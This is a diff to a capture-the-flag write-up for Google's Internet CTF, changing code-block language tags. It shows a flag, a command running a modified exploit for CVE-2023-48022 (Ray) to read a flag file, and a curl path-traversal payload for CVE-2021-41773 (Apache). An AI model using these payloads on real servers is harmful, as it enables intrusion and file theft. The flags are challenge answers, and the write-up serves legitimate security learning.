@@ -5,7 +5,7 @@ description: "https://capturetheflag.withgoogle.com/internet"
 
 ## Mic Check
 
-```
+```mdx
 tap tap tap Is this thing on? Here's a flag CTF{welcome_internetctf}
 ```
 
@@ -15,7 +15,7 @@ Read more about CVE-2023-48022 at : https://www.vicarius.io/vsociety/posts/the-s
 
 Modified `exploit.py`
 
-```
+```python exploit.py
 import argparse
 import time
 import os
@@ -69,7 +69,7 @@ if __name__ == "__main__":
 
 get the ip of the hosted url using `dig`
 
-```
+```bash
  python3 exploit.py --host http://34.147.80.1:1337 --cmd 'cat /flag/flag.txt'
 ```
 
@@ -77,7 +77,7 @@ get the ip of the hosted url using `dig`
 
 Read more about CVE-2021-41773 at : https://www.hackthebox.com/blog/cve-2021-41773-explained
 
-```
+```bash
 curl http://chal-apache.internet-ctf.kctf.cloud:1337/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag/flag.txt
 ```
 
